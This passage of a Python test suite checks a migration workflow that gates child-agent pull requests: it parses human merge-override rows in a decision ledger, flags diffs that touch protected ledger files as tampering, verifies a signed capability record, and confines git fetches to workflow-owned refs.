def test_override_decision_row_names_units_in_its_text_not_in_its_metadata():
    override_decision = _batch_runtime()["override_decision"]
    row = "| D-7 | 2024-05-02 | user:U1 | merge_override for u |\n"
    assert override_decision("D-7", ["u"], row)
    assert not override_decision("D-7", ["U1"], row)                 # the provenance id is not a unit
    assert not override_decision("D-7", ["2024-05-02"], row)         # nor the date
    assert not override_decision("D-7", ["u", "U1"], row)
    assert override_decision("D-7", ["u", "v"], "| D-7 | user:U1 | merge_override for u and v (feed gap) |")
    # column order is the ledger author's: units before the marker count too
    assert override_decision("D-7", ["orders"], "| D-7 | units: orders | user:U1 | merge_override for an accepted feed gap |")
    assert override_decision("D-7", ["u", "v"], "| 2024-05-02T10:00:00Z | D-7 | u, v | user:U1 | merge_override |")
    # but never a unit that is only the row's id, date or author
    assert not override_decision("D-7", ["D-7"], "| D-7 | user:U1 | merge_override for u |")
    assert not override_decision("D-7", ["2024-05-02"], "| D-7 | 2024-05-02 | user:U1 | merge_override for u |")
    assert not override_decision("D-7", ["U1"], "| D-7 | user:U1 | merge_override for u |")
    assert not override_decision("D-7", ["u"], "| D-7 | user:u | merge_override for v |")


def test_override_decision_is_the_row_whose_id_cell_is_the_decision_not_a_row_that_mentions_it():
    """A decision id authorizes only through its own row: one that cites it in prose (supersedes D-7,
    see D-7) is another decision, and D-7 must be looked up as a row of its own."""
    override_decision = _batch_runtime()["override_decision"]
    assert not override_decision("D-7", ["u"], "| D-9 | user:U1 | merge_override for u, supersedes D-7 |")
    assert not override_decision("D-7", ["u"], "| D-9 | user:U1 | merge_override for u | D-7 |")
    assert not override_decision("D-7", ["u"], "D-7 user:U1 merge_override for u")   # prose, not a table row
    assert override_decision("D-7", ["u"], "D-7 | user:U1 | merge_override for u")   # edge pipes are optional
    assert override_decision("D-7", ["u"], "D-7 | user:U1 | merge_override for u |")
    assert override_decision("D-7", ["u"], "| D-9 | user:U1 | merge_override for v |\n| D-7 | user:U1 | merge_override for u |")


def test_override_decision_counts_a_unit_named_like_metadata_when_the_row_names_it_in_its_text():
    """Ids, dates and provenance are excluded by cell, not by shape: a unit called D-7, 2024-05-02 or
    default-accepted is named like any other when it appears in the row's text."""
    override_decision = _batch_runtime()["override_decision"]
    assert override_decision("D-9", ["D-7"], "| D-9 | 2026-09-16 | user:evt-1 | merge_override for D-7 |")
    assert override_decision("D-9", ["2024-05-02"], "| D-9 | 2026-09-16 | user:evt-1 | merge_override for 2024-05-02 |")
    assert override_decision("D-9", ["default-accepted"], "| D-9 | user:evt-1 | merge_override for default-accepted |")
    assert not override_decision("D-9", ["D-7"], "| D-9 | D-7 | user:evt-1 | merge_override for u |")   # a cell that is only an id
    assert not override_decision("D-9", ["2026-09-16"], "| D-9 | 2026-09-16 | user:evt-1 | merge_override for u |")
    assert not override_decision("D-9", ["evt-1"], "| D-9 | user:evt-1 | merge_override for u |")


def test_override_decision_provenance_is_a_cell_of_its_own_not_a_mention_in_the_text():
    """Human provenance is the row's provenance cell, exactly `user:<id>`, as the STOP C row's is: a row whose
    text mentions a user (default-accepted rows citing who asked, prose quoting an event id) is not a
    human's decision, and a row with a default-accepted cell is the orchestrator's whatever else it says."""
    override_decision = _batch_runtime()["override_decision"]
    assert not override_decision("D-7", ["u"], "| D-7 | 2024-05-02 | user:U1 merge_override for u |")
    assert not override_decision("D-7", ["u"], "| D-7 | default-accepted | merge_override for u, as user:U1 asked |")
    assert not override_decision("D-7", ["u"], "| D-7 | default-accepted (soft) | user:U1 | merge_override for u |")
    assert not override_decision("D-7", ["u"], "| D-7 | D-7 user:U1 | merge_override for u |")
    assert not override_decision("D-7", ["u"], "| D-7 | user:U1 said so | merge_override for u |")
    assert override_decision("D-7", ["u"], "| D-7 | user:U1 | merge_override for u |")
    assert override_decision("D-7", ["u"], "| D-7 |  user:U1  | merge_override for u |")
    assert override_decision("D-7", ["u"], "| D-7 | user:U1 | waive for u |", word="waive")
    assert not override_decision("D-7", ["u"], "| D-7 | default-accepted | user:U1 waive for u |", word="waive")


def test_one_ineligible_unit_in_the_batch_needs_the_override_even_when_the_child_says_eligible():
    ns = _batch_runtime()
    ns["unit_eligibility"] = lambda head, units: {"u": True, "u2": False, "u3": None}
    ns["decision_ledger"] = lambda: LEDGER + "| D-9 | user:U1 | merge_override for u, u2, u3 |\n"

    def run(report):
        async def agent(prompt, **kwargs):
            return dict(report)
        ns["agent"] = agent
        batch = {"id": "b", "units": ["u", "u2", "u3"], "write_targets": ["t"], "brief": "b"}
        return asyncio.run(ns["run_batch"](batch, asyncio.Semaphore(1), ns["Breaker"](3)))

    base = {"status": "PASS", "recon_verdict": "PASS", "recon_mode": "live", "merge_eligible": True,
            "pr_url": "https://example/pr/1", "branch": "f", "changed_paths": [], "one_line_summary": "ok"}
    out = run(base)
    assert out["status"] == "FAIL" and out["failure_class"] == "merge_authority" and "merge_authority" not in out
    assert "recon/u2/result.json" in out["one_line_summary"] and "merge_eligible=False" in out["one_line_summary"]
    assert "recon/u3/result.json" in out["one_line_summary"] and "missing or malformed" in out["one_line_summary"]
    out = run({**base, "merge_authority": {"kind": "human_override", "decision_id": "D-9"}})
    assert out["status"] == "PASS" and out["merge_authority"] == {"kind": "human_override", "decision_id": "D-9"}


def test_override_decision_row_needs_human_provenance():
    override_decision = _batch_runtime()["override_decision"]
    assert not override_decision("D-8", ["other_unit"], LEDGER)          # default-accepted is not a human
    assert not override_decision("D-7", ["u"], LEDGER.replace("user:", "bot:"))
    assert not override_decision("D-7", ["u"], LEDGER.replace("user:", "user"))
    assert not override_decision("D-7", ["u"], LEDGER.replace("user:U1", "user:"))      # user: with no event id
    assert override_decision("D-7", ["u"], LEDGER.replace("user:U1 | merge", "user:a.b@x.io | merge"))


def test_override_decision_marker_does_not_stand_in_for_a_unit_of_that_name():
    """A unit may be called merge_override (UNIT_ID allows it); the row's one authority marker is not then
    also the mention of that unit. The row has to name it a second time."""
    override_decision = _batch_runtime()["override_decision"]
    row = "| D-9 | 2024-05-03 | user:U2 | merge_override for an accepted feed gap |\n"
    assert not override_decision("D-9", ["merge_override"], row)
    assert not override_decision("D-9", ["merge_override", "u"], row.replace("gap", "gap in u"))
    assert override_decision("D-9", ["merge_override"], row.replace("gap", "gap in merge_override"))
    assert override_decision("D-9", ["merge_override", "u"], row.replace("gap", "gap in merge_override and u"))


def test_child_schema_and_prompt_carry_merge_eligible_and_merge_authority():
    src = WORKFLOW.read_text()
    tree = ast.parse(src)
    schema = next(ast.literal_eval(n.value) for n in tree.body
                  if isinstance(n, ast.Assign) and any(isinstance(t, ast.Name) and t.id == "CHILD_SCHEMA" for t in n.targets))
    assert "merge_eligible" in schema["required"] and schema["properties"]["merge_eligible"]["type"] == "boolean"
    assert schema["properties"]["merge_authority"]["properties"]["kind"]["enum"] == ["harness", "human_override"]
    ns = _prompt_ns(_manifest())
    child = ns["child_prompt"](_manifest()["batches"][0])
    assert "merge_eligible" in child and "merge_override" in child and "06_decisions.md" in child
    passed = [{"batch": "b", "units": ["u"], "pr_url": "https://example/pr/1",
               "merge_authority": {"kind": "human_override", "decision_id": "D-7"}}]
    verify = ns["verify_prompt"](passed, False)
    assert "human_override" in verify and "D-7" in verify


def test_prompts_name_every_merge_evidence_mode():
    ns = _prompt_ns(_manifest())
    child = ns["child_prompt"](_manifest()["batches"][0])
    verify = ns["verify_prompt"]([{"batch": "b", "pr_url": "https://example/pr/1"}], False)
    for mode in ("live", "snapshot", "transactional"):
        assert mode in child and mode in verify
    assert "Fixture evidence is never PASS" in child


def test_fresh_runs_reject_a_pointer_run_id_and_clear_the_stale_run_record(tmp_path):
    tree = ast.parse(WORKFLOW.read_text())
    selected = [node for node in tree.body
                if isinstance(node, ast.AsyncFunctionDef) and node.name == "main"]
    source = WORKFLOW.read_text()
    assert "RUN_ID is not None and MODE != \"resume\"" in source
    main_source = ast.get_source_segment(source, selected[0])
    assert "RUN_ID_PATH.unlink(missing_ok=True)" in main_source
    assert "write_text(RUN_ID" not in main_source
    namespace = {
        "resume": False,
        "RUN_ID": None,
        "RUN_ID_PATH": tmp_path / "w.run_id",
        "META": {},
        "register_workflow": _stop_register_workflow,
    }
    (tmp_path / "w.run_id").write_text("stale\n")
    exec(compile(ast.Module(body=selected, type_ignores=[]), str(WORKFLOW), "exec"), namespace)
    with pytest.raises(RuntimeError, match="stop"):
        asyncio.run(namespace["main"]())
    assert not (tmp_path / "w.run_id").exists()


# ---------------------------------------------------------------- ledger gate (changed_paths)

LEDGER_FILES = [".migration/03_recon_tolerances.json", ".migration/allowed_targets.json",
                ".migration/06_decisions.md", ".migration/09_capabilities.json", ".migration/units/u/mapping_spec.json"]


def _pass(**extra):
    return {"status": "PASS", "recon_verdict": "PASS", "recon_mode": "live", "merge_eligible": True,
            "pr_url": "https://example/pr/1", "branch": "f", "one_line_summary": "ok", **extra}


def test_clean_diff_stays_pass_and_recon_evidence_for_its_own_units_is_allowed():
    ns = _batch_runtime()
    out = _run_one(ns, _pass(changed_paths=["src/loans.sql", ".migration/recon/u/result.json"]))
    assert out["status"] == "PASS" and "failure_class" not in out
    assert ns["ledger_violations"](["a.py", ".migration/recon/u/x", ".migration/recon/u/deep/y"], ["u"]) == []


@pytest.mark.parametrize("path", LEDGER_FILES + [".migration/recon/other_unit/result.json", ".migration/recon/wave-1/report.md"])
def test_diff_touching_the_ledger_is_downgraded_to_ledger_tampered(path):
    out = _run_one(_batch_runtime(), _pass(changed_paths=["src/loans.sql", path]))
    assert out["status"] == "FAIL" and out["failure_class"] == "ledger_tampered"
    assert path in out["one_line_summary"] and out["one_line_summary"].startswith("PASS downgraded")


@pytest.mark.parametrize("report", [_pass(), _pass(changed_paths="src/x.sql"), _pass(changed_paths=[".migration/x", 3])])
def test_pass_without_a_usable_changed_paths_is_not_pass(report):
    out = _run_one(_batch_runtime(), report)
    assert out["status"] == "FAIL" and out["failure_class"] == "ledger_tampered"
    assert "changed_paths" in out["one_line_summary"]


def test_a_failed_child_that_touched_the_ledger_is_still_reclassified():
    out = _run_one(_batch_runtime(), {"status": "FAIL", "recon_verdict": "FAIL", "recon_mode": "live",
                                      "failure_class": "decimal_rounding", "one_line_summary": "off by one",
                                      "changed_paths": [".migration/03_recon_tolerances.json"]})
    assert out["failure_class"] == "ledger_tampered"


def test_breaker_counts_ledger_tampering():
    ns = _batch_runtime()

    async def agent(prompt, **kwargs):
        return _pass(changed_paths=[".migration/allowed_targets.json"])

    ns["agent"] = agent

    async def exercise():
        breaker = ns["Breaker"](3)
        for i in range(3):
            await ns["run_batch"]({"id": f"b{i}", "units": ["u"], "write_targets": ["t"], "brief": "b"},
                                  asyncio.Semaphore(1), breaker)
        return breaker

    assert asyncio.run(exercise()).tripped_on == "ledger_tampered"


def test_child_schema_requires_changed_paths():
    tree = ast.parse(WORKFLOW.read_text())
    ns = {t.id: ast.literal_eval(node.value) for node in tree.body if isinstance(node, ast.Assign)
          for t in node.targets if isinstance(t, ast.Name) and t.id.endswith("_SCHEMA")}
    for schema in (ns["CHILD_SCHEMA"], ns["VERIFY_SCHEMA"]):
        assert "changed_paths" in schema["required"]
        assert schema["properties"]["changed_paths"]["items"] == {"type": "string"}
        assert "git diff --name-only" in schema["properties"]["changed_paths"]["description"]


def test_prompts_demand_changed_paths_and_base_branch_policy_files():
    ns = _prompt_ns(_manifest())
    child = ns["child_prompt"](_manifest()["batches"][0])
    assert "git diff --name-only" in child and "changed_paths" in child
    assert ".migration/recon/<unit_id>/" in child and "ledger_tampered" in child
    verify = ns["verify_prompt"]([{"batch": "b", "units": ["u"], "pr_url": "https://example/pr/1"}], False)
    assert "git diff --name-only" in verify and "changed_paths" in verify
    assert "03_recon_tolerances.json" in verify and "allowed_targets.json" in verify
    assert "base branch" in verify and "not the PR" in verify
    assert ".migration/recon/<unit_id>/" in verify and "ledger_tampered" in verify


def test_validate_verify_requires_changed_paths_inside_the_wave_report_dir():
    validate_verify = _functions()["validate_verify"]
    passed = [{"batch": "w2-b03", "units": ["u"], "pr_url": "https://example/pr/3"}]
    ok = {"wave_verdict": "PASS", "unit_verdicts": {"w2-b03": "PASS"}, "merged_prs": [], "findings": [],
          "changed_paths": [".migration/recon/wave-2/report.md"]}
    assert validate_verify(ok, passed, False, wave=2, observed=[]) == []
    problems = validate_verify({**ok, "changed_paths": [".migration/recon/wave-2/report.md",
                                                        ".migration/03_recon_tolerances.json"]}, passed, False, 2, [])
    assert problems == ["verifier output invalid: ledger tampered, changed .migration/03_recon_tolerances.json"]
    problems = validate_verify({**ok, "changed_paths": [".migration/recon/wave-3/report.md"]}, passed, False, 2, [])
    assert problems == ["verifier output invalid: ledger tampered, changed .migration/recon/wave-3/report.md"]
    problems = validate_verify({k: v for k, v in ok.items() if k != "changed_paths"}, passed, False, 2, [])
    assert problems == ["verifier output invalid: changed_paths must be a list of paths (git diff --name-only)"]


def test_validate_verify_reads_the_report_branch_from_git_not_only_the_self_report():
    validate_verify = _functions()["validate_verify"]
    passed = [{"batch": "w2-b03", "units": ["u"], "pr_url": "https://example/pr/3"}]
    ok = {"wave_verdict": "PASS", "unit_verdicts": {"w2-b03": "PASS"}, "merged_prs": [], "findings": [],
          "changed_paths": [".migration/recon/wave-2/report.md"]}
    assert validate_verify(ok, passed, False, wave=2, observed=[".migration/recon/wave-2/report.md"]) == []
    tampered = validate_verify(ok, passed, False, wave=2,
                               observed=[".migration/recon/wave-2/report.md", ".migration/allowed_targets.json"])
    assert tampered == ["verifier output invalid: ledger tampered, changed .migration/allowed_targets.json"]
    unverifiable = validate_verify(ok, passed, False, wave=2, observed=None)
    assert len(unverifiable) == 1 and "recon/wave-2" in unverifiable[0] and "git" in unverifiable[0]
    # `observed` is what the verifier itself changed (verifier_changed_paths): a passed unit's evidence in
    # it means the verifier rewrote it, which is not the verifier's to do
    problems = validate_verify(ok, passed, False, wave=2,
                               observed=[".migration/recon/wave-2/report.md", ".migration/recon/u/result.json"])
    assert problems == ["verifier output invalid: ledger tampered, changed .migration/recon/u/result.json"]
    src = WORKFLOW.read_text()
    assert 'validate_verify(verify, passed, auto_merge, TAG, verifier_changed_paths(TAG, passed))' in src


# ---------------------------------------------------------------- capability contract vs the doctor's record (A3)

DOCTOR = {"schema": "dbx-migration-factory/capabilities/1", "ready": True,
          "identity": {"userName": "sp-1", "service_principal": True, "host": "https://adb-1.azuredatabricks.net"},
          "checks": [{"id": "allowed_targets", "status": "ok", "data": {"catalogs": ["mig"], "guard_mode": "block"}},
                     {"id": "workspace", "status": "ok", "data": {"stop_mode": "soft"}}]}


def test_validate_manifest_compares_the_contract_with_the_doctor_record():
    validate_manifest = _functions()["validate_manifest"]
    validate_manifest(_manifest(capabilities=_caps(host=DOCTOR["identity"]["host"])), DOCTOR)
    # the doctor records guard-normalized catalog names; a manifest spelling the guard accepts is the same contract
    validate_manifest(_manifest(capabilities=_caps(host=DOCTOR["identity"]["host"], catalogs=["`MIG` "])), DOCTOR)
    for caps, needle in ((_caps(), "host"),
                         (_caps(host="https://adb-2.azuredatabricks.net"), "host"),
                         (_caps(host=DOCTOR["identity"]["host"], identity="sp-2"), "identity"),
                         (_caps(host=DOCTOR["identity"]["host"], catalogs=["mig", "prod"]), "catalogs"),
                         (_caps(host=DOCTOR["identity"]["host"], guard_mode="warn"), "guard_mode"),
                         (_caps(host=DOCTOR["identity"]["host"], stop_mode="hard"), "stop_mode")):
        with pytest.raises(SystemExit, match=f"capabilities.*{needle}.*09_capabilities.json"):
            validate_manifest(_manifest(capabilities=caps, auto_merge=False), DOCTOR)
    with pytest.raises(SystemExit, match="ready"):
        validate_manifest(_manifest(capabilities=_caps(host=DOCTOR["identity"]["host"])), {**DOCTOR, "ready": False})
    with pytest.raises(SystemExit, match="09_capabilities.json"):
        validate_manifest(_manifest(capabilities=_caps(host=DOCTOR["identity"]["host"])), {**DOCTOR, "identity": None})
    source = {"family": "sqlserver", "secret": "LEGACY_DSN", "params": {"db": "loans"}}
    with pytest.raises(SystemExit, match="manifest 'source' differs"):
        validate_manifest(_manifest(source=source), {**DOCTOR, "source": {**source, "secret": "OTHER_DSN"}})


def test_workflow_launches_from_the_signed_doctor_record_not_the_editable_one():
    src = WORKFLOW.read_text()
    assert "RECORDED" not in src
    assert "DOCTOR = signed_doctor_report(DOCTOR_PATH, MANIFEST_BYTES)" in src
    assert "if not SMOKE:\n    validate_manifest(MANIFEST, DOCTOR)" in src
    assert "fresh_doctor_report" not in src and "DOCTOR_PY" not in src


def _launch_ns(tmp_path, fake_run=None):
    tree = ast.parse(WORKFLOW.read_text())
    selected = [node for node in tree.body
                if (isinstance(node, ast.FunctionDef)
                    and node.name in {"signed_doctor_report", "wave_signature", "pr_changed_paths",
                                      "ref_changed_paths", "wave_base", "launch_base", "evidence_in_pr",
                                      "verifier_changed_paths", "_git_paths", "_base_tip", "replay_gate",
                                      "fetch_ref", "pr_head"})
                or (isinstance(node, ast.Assign) and any(
                    isinstance(t, ast.Name) and t.id in {"PR_URL", "UNIT_ID"} for t in node.targets))]
    ns = {"datetime": datetime, "hashlib": hashlib, "hmac": hmac, "json": json, "os": os, "re": re,
          "sys": sys, "subprocess": subprocess, "Path": Path, "ROOT": tmp_path,
          "BASE_BRANCH": "main", "BASE_SHA": "b" * 40, "REPO": "github.com/acme/dbx-target", "resume": False,
          "TAG": "orders-1", "MANIFEST": {"repo": "github.com/acme/dbx-target"},
          "MANIFEST_PATH": tmp_path / ".migration" / "waves" / "wave-1.json",
          "BASE_SHA_PATH": tmp_path / ".migration" / "waves" / "wave-1.base_sha",
          "DOCTOR_MAX_AGE": datetime.timedelta(minutes=15),
          "HOOK_PROBE_RESULT": "blocked:0123abcd"}
    exec(compile(ast.Module(body=selected, type_ignores=[]), str(WORKFLOW), "exec"), ns)
    if fake_run is not None:
        ns["subprocess"] = type("S", (), {"run": staticmethod(fake_run), "SubprocessError": subprocess.SubprocessError,
                                            "CalledProcessError": subprocess.CalledProcessError})
    return ns


def test_signed_doctor_report_gate(tmp_path):
    sys.path.insert(0, str(WORKFLOW.parents[1] / "factory-doctor"))
    import doctor

    manifest_bytes = b'{"wave": 1}'
    report = {"ready": True, "identity": {"userName": "sp-1", "host": "h"},
              "hook_probe": "blocked:0123abcd", "checks": []}
    signed = doctor.sign_wave_report(report, manifest_bytes, signed_at="2026-01-01T00:00:00+00:00")
    path = tmp_path / "wave-1.doctor.json"
    path.write_text(json.dumps(signed))
    ns = _launch_ns(tmp_path)
    assert ns["signed_doctor_report"](path, manifest_bytes,
                                      now=datetime.datetime(2026, 1, 1, 0, 1, tzinfo=datetime.timezone.utc)) == signed
    cases = [
        (None, manifest_bytes, "no doctor record"),
        (signed, b'{"wave": 2}', "another manifest"),
        (doctor.sign_wave_report(report, manifest_bytes, signed_at="2025-12-31T23:44:00+00:00"),
         manifest_bytes, "more than"),
        ({**signed, "signature": "0" * len(signed["signature"])}, manifest_bytes, "does not verify"),
        ({**signed, "signed_at": "2025-12-31T23:59:00+00:00"},
         manifest_bytes, "does not verify"),
        ({**signed, "ready": False}, manifest_bytes, "does not verify"),
    ]
    for value, mb, match in cases:
        if value is None:
            path.unlink(missing_ok=True)
        else:
            path.write_text(json.dumps(value))
        with pytest.raises(SystemExit, match=match):
            ns["signed_doctor_report"](path, mb,
                                       now=datetime.datetime(2026, 1, 1, 0, 1, tzinfo=datetime.timezone.utc))
    assert ns["wave_signature"](signed, manifest_bytes) == doctor.wave_signature(signed, manifest_bytes)


def _git_fake(calls, head, merged, paths):
    """git as the gate sees it: the PR head fetched into this workflow's own ref, origin/main at 't'*40 (fresh fetch),
    `merge-base --is-ancestor` answering whether the head is already in it, one diff."""
    def fake_run(cmd, **kw):
        calls.append(cmd)
        if cmd[3] == "fetch":
            return subprocess.CompletedProcess(cmd, 0)
        if cmd[3] == "rev-parse":
            return subprocess.CompletedProcess(cmd, 0, stdout=("t" * 40 if "origin/main^{commit}" in cmd else head) + "\n")
        if cmd[3] == "merge-base":
            return subprocess.CompletedProcess(cmd, 0 if merged else 1)
        return subprocess.CompletedProcess(cmd, 0, stdout=paths)
    return fake_run


def test_pr_changed_paths_comes_from_the_pr_head_ref_of_this_repo(tmp_path):
    calls = []
    ns = _launch_ns(tmp_path, _git_fake(calls, "c" * 40, False, "src/a.sql\n.migration/allowed_targets.json\n"))
    # the gated head's sha comes back with the paths: the verifier's tree is later held to exactly it
    assert ns["pr_changed_paths"]("https://github.com/acme/dbx-target/pull/42") == (
        "c" * 40, ["src/a.sql", ".migration/allowed_targets.json"])
    # the host writes refs/pull/N/head; the child's branch name never reaches git. The fetch lands in a ref
    # only this workflow writes: FETCH_HEAD is shared by every process in the clone, so a sibling
    # pipeline's fetch between the two commands would hand this wave another PR's head
    local = "refs/migration/wave-orders-1/refs/pull/42/head"
    assert calls[0] == ["git", "-C", str(tmp_path), "fetch", "-q", "origin", f"+refs/pull/42/head:{local}"]
    assert calls[1][3:] == ["rev-parse", "--verify", local + "^{commit}"]
    assert not any("FETCH_HEAD" in " ".join(c) for c in calls)
    # the base is fetched now, not read from the launch snapshot: a child launched on a resume forked from
    # a base the verifier had merged accepted units into, and those units are not its diff
    assert calls[2][3:] == ["fetch", "-q", "origin", "+refs/heads/main:refs/remotes/origin/main"]
    assert calls[3][3:] == ["rev-parse", "--verify", "origin/main^{commit}"]
    assert calls[4][3:] == ["merge-base", "--is-ancestor", "c" * 40, "t" * 40]
    # --no-renames: a ledger file moved under an allowed recon/ path must still surface its old path.
    # An unmerged head diffs from its own fork point on the base (three-dot against the fresh tip)
    assert calls[5][3:] == ["diff", "--name-only", "--no-renames", "t" * 40 + "..." + "c" * 40]
    assert len(calls) == 6
    calls.clear()
    # a head the base already contains (the verifier merged it before the run stopped, or a child merged
    # its own PR) would be its own merge base and diff to nothing: it is anchored at the launch base instead
    ns = _launch_ns(tmp_path, _git_fake(calls, "c" * 40, True, "src/a.sql\n"))
    assert ns["pr_changed_paths"]("https://github.com/acme/dbx-target/pull/42") == ("c" * 40, ["src/a.sql"])
    assert calls[5][3:] == ["diff", "--name-only", "--no-renames", "b" * 40 + "..." + "c" * 40]
    calls.clear()
    for url in ("https://github.com/other/repo/pull/42", "https://github.com/acme/dbx-target/pull/x",
                "https://github.com/acme/dbx-target/pull/42/../../other/repo/pull/1", "", None, 42):
        assert ns["pr_changed_paths"](url) is None
    assert calls == []

    def failing(cmd, **kw):
        raise subprocess.CalledProcessError(128, cmd)

    assert _launch_ns(tmp_path, failing)["pr_changed_paths"]("https://github.com/acme/dbx-target/pull/42") is None
    assert _launch_ns(tmp_path, failing)["ref_changed_paths"]("recon/wave-2") is None


def test_every_fetch_the_gate_makes_lands_in_this_workflows_own_ref(tmp_path):
    calls = []
    ns = _launch_ns(tmp_path, _git_fake(calls, "c" * 40, False, ""))
    assert ns["ref_changed_paths"]("recon/wave-orders-1") == ("c" * 40, [])
    assert calls[0][3:] == ["fetch", "-q", "origin", "+recon/wave-orders-1:refs/migration/wave-orders-1/recon/wave-orders-1"]
    assert calls[1][3:] == ["rev-parse", "--verify", "refs/migration/wave-orders-1/recon/wave-orders-1^{commit}"]
    calls.clear()
    assert ns["pr_head"]("https://github.com/acme/dbx-target/pull/7") == "c" * 40
    assert calls[0][3:] == ["fetch", "-q", "origin", "+refs/pull/7/head:refs/migration/wave-orders-1/refs/pull/7/head"]
    assert calls[1][3:] == ["rev-parse", "--verify", "refs/migration/wave-orders-1/refs/pull/7/head^{commit}"]
    assert ns["pr_head"]("https://github.com/other/repo/pull/7") is None
    assert "FETCH_HEAD" not in WORKFLOW.read_text()


def _replay_git(calls, head, record_merged, paths):
    """git as replay_gate sees it: the PR's current head fetched into this workflow's ref, origin/main at 't'*40, `merge-base
    --is-ancestor` true for the recorded head only when record_merged (the resumed run's verifier merged it),
    never for the current head; one diff."""
    def fake_run(cmd, **kw):
        calls.append(cmd)
        if cmd[3] == "fetch":
            return subprocess.CompletedProcess(cmd, 0)
        if cmd[3] == "rev-parse":
            return subprocess.CompletedProcess(cmd, 0, stdout=("t" * 40 if "origin/main^{commit}" in cmd else head) + "\n")
        if cmd[3] == "merge-base":
            return subprocess.CompletedProcess(cmd, 0 if record_merged and cmd[5] == "c" * 40 else 1)
        return subprocess.CompletedProcess(cmd, 0, stdout=paths)
    return fake_run


def test_replay_gate_reuses_the_recorded_head_only_while_the_pr_still_points_at_it(tmp_path):
    """A PR URL names no tree: the PR may have gained commits between the halt and the resume. The recorded
    gate stands only if the PR's head is still the recorded one, or the base already contains the recorded
    head (the resumed run's verifier merged it; its diff now would attribute other units to it).
    Otherwise the current head is gated like a new child's."""
    url, record = "https://github.com/acme/dbx-target/pull/42", {"pr_head": "c" * 40}
    calls = []
    # the PR still points at the recorded head: its diff (anchored at the launch base once merged, so
    # possibly naming other units' evidence) is not what gates it; the recorded head stands as gated
    ns = _launch_ns(tmp_path, _replay_git(calls, "c" * 40, False, ".migration/recon/other/result.json\n"))
    assert ns["replay_gate"](record, url) == ("c" * 40, [])
    assert calls[0][3:] == ["fetch", "-q", "origin",
                            "+refs/pull/42/head:refs/migration/wave-orders-1/refs/pull/42/head"]  # the PR's head, fetched now
    calls.clear()
    # the PR gained a commit touching the allowlist since the record: the new head is gated, and fails
    ns = _launch_ns(tmp_path, _replay_git(calls, "e" * 40, False, ".migration/allowed_targets.json\nsrc/a.sql\n"))
    assert ns["replay_gate"](record, url) == ("e" * 40, [".migration/allowed_targets.json", "src/a.sql"])
    assert ["merge-base", "--is-ancestor", "c" * 40, "t" * 40] in [c[3:] for c in calls]  # was the record merged?
    assert calls[5][3:] == ["diff", "--name-only", "--no-renames", "t" * 40 + "..." + "e" * 40]
    calls.clear()
    # positive control: the recorded head is already in the base (merged by the resumed run's verifier);
    # whatever the PR points at now, that merged tree is what passed
    ns = _launch_ns(tmp_path, _replay_git(calls, "e" * 40, True, ".migration/allowed_targets.json\n"))
    assert ns["replay_gate"](record, url) == ("c" * 40, [])
    # not a PR of this repo, or git cannot answer: nothing to reuse, no PASS stands
    assert ns["replay_gate"](record, "https://github.com/other/repo/pull/42") is None

    def failing(cmd, **kw):
        raise subprocess.CalledProcessError(128, cmd)

    assert _launch_ns(tmp_path, failing)["replay_gate"](record, url) is None


def test_the_ledger_base_is_snapshotted_once_at_launch_before_any_wave_pr_can_merge(tmp_path):
    calls = []

    def fake_run(cmd, **kw):
        calls.append(cmd)
        return subprocess.CompletedProcess(cmd, 0, stdout="a" * 40 + "\n")

    ns = _launch_ns(tmp_path, fake_run)
    assert ns["wave_base"]() == "a" * 40
    assert calls[0] == ["git", "-C", str(tmp_path), "fetch", "-q", "origin", "+refs/heads/main:refs/remotes/origin/main"]
    assert calls[1] == ["git", "-C", str(tmp_path), "rev-parse", "--verify", "origin/main^{commit}"]

    def failing(cmd, **kw):
        raise subprocess.CalledProcessError(128, cmd)

    with pytest.raises(SystemExit, match="main"):
        _launch_ns(tmp_path, failing)["wave_base"]()
    # a fresh launch persists the sha beside the manifest before the doctor, any child or the verifier runs
    ns["BASE_SHA_PATH"].parent.mkdir(parents=True)
    assert ns["launch_base"]() == "a" * 40
    assert ns["BASE_SHA_PATH"].read_text() == "a" * 40 + "\n"
    # a resume reuses it rather than re-reading a base the verifier has merged into (the run may have
    # stopped before writing any result), and cannot run without it
    calls.clear()
    ns["resume"] = True
    assert ns["launch_base"]() == "a" * 40 and calls == []
    for bad in ("origin/main\n", ""):
        ns["BASE_SHA_PATH"].write_text(bad)
        with pytest.raises(SystemExit, match="mode: rerun"):
            ns["launch_base"]()
    ns["BASE_SHA_PATH"].unlink()
    with pytest.raises(SystemExit, match="mode: rerun"):
        ns["launch_base"]()
    src = WORKFLOW.read_text()
    assert re.search(r"validate_manifest\(MANIFEST\)\ncheck_wave_tag\(TAG, MANIFEST\)\nBASE_SHA = None if PREFLIGHT else launch_base\(\)\nDOCTOR = signed_doctor_report", src)
    assert 'BASE_SHA_PATH = MANIFEST_PATH.with_suffix(".base_sha")' in src and '"base_sha": BASE_SHA' in src


def test_verifier_changed_paths_is_the_verifier_branch_minus_the_gated_pr_trees_it_merged(tmp_path):
    calls = []
    # the verifier's tree per unit dir: u rewritten (differs from the gated head 1*40 and from the launch
    # base b*40), v byte-identical to its gated head, w untouched (differs from the gated head it did not
    # merge, auto_merge off, but equals the base)
    trees = {("1" * 40, ".migration/recon/u/"): ".migration/recon/u/result.json\n",
             ("b" * 40, ".migration/recon/u/"): ".migration/recon/u/result.json\n.migration/recon/u/rows.csv\n",
             ("2" * 40, ".migration/recon/v/"): "", ("b" * 40, ".migration/recon/v/"): ".migration/recon/v/result.json\n",
             ("3" * 40, ".migration/recon/w/"): ".migration/recon/w/result.json\n", ("b" * 40, ".migration/recon/w/"): ""}

    def fake_run(cmd, **kw):
        calls.append(cmd)
        if cmd[3] == "fetch":
            return subprocess.CompletedProcess(cmd, 0)
        if cmd[3] == "rev-parse":
            return subprocess.CompletedProcess(cmd, 0, stdout=("t" * 40 if "origin/main^{commit}" in cmd else "v" * 40) + "\n")
        if cmd[3] == "merge-base":
            return subprocess.CompletedProcess(cmd, 1)
        if "--" in cmd:
            return subprocess.CompletedProcess(cmd, 0, stdout=trees[cmd[6], cmd[9]])
        return subprocess.CompletedProcess(cmd, 0, stdout=(
            ".migration/recon/wave-2/report.md\nsrc/loans.sql\n.migration/recon/u/result.json\n"
            ".migration/recon/u/rows.csv\n.migration/recon/v/result.json\n.migration/03_recon_tolerances.json\n"))

    ns = _launch_ns(tmp_path, fake_run)
    passed = [{"batch": "b1", "units": ["u"], "pr_head": "1" * 40}, {"batch": "b2", "units": ["v"], "pr_head": "2" * 40},
              {"batch": "b3", "units": ["w"], "pr_head": "3" * 40}]
    # merged evidence byte-identical to the gated PR head drops out, so does evidence the verifier never
